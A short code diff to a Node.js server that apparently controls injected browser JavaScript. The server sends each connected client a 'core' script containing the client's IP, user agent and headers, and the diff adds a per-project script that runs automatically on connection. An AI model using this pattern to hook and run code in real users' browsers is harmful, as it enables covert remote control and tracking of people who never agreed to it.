@@ -1095,8 +1095,9 @@ MongoClient.connect(config.mongodb, function (err, db) {
             } else {
               resolve({
                 project: {
+                  id: doc['_id'],
                   name: doc.name,
-                  id: doc['_id']
+                  inject: doc.inject
                 },
                 id: +new Date(),
                 debug: debug
@@ -1187,6 +1188,10 @@ MongoClient.connect(config.mongodb, function (err, db) {
           send('execute', script)
         }
       })
+
+      /**
+       * Send the inject core
+       */
       if (debug) {
         var core = inject.debugCore
       } else {
@@ -1194,6 +1199,15 @@ MongoClient.connect(config.mongodb, function (err, db) {
       }
       core = core.replace('client.ip', JSON.stringify(ip)).replace('client.agent', JSON.stringify(agent)).replace('client.headers', JSON.stringify(socket.headers))
       send('core', core)
+
+      /**
+       * Send the auto-execute script
+       */
+      if (project.inject) {
+        if (project.inject.autoexecute) {
+          send('execute', project.inject.autoexecute)
+        }
+      }
 
       socket.on('data', rawData => {
         try { rawData = JSON.parse(rawData); if (!rawData.t && !rawData.d) return } catch (e) { return }
@@ -1211,6 +1225,9 @@ MongoClient.connect(config.mongodb, function (err, db) {
           send('execute', data)
         })
 
+        /**
+         * Module loader
+         */
         on('module', data => { // load a module
           if (!data.name) return
           var js = inject.modules[data.name]
